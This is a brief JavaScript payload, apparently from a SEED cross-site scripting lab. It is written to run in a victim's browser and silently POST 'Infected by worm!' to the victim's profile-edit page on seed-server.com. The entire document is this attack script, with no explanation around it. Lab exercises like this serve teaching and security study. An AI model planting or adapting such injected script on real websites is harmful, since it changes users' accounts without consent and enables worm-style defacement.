var content = "&description=Infected by worm!";
var sendurl = "http://www.seed-server.com/action/profile/edit";
var Ajax = new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send(content);
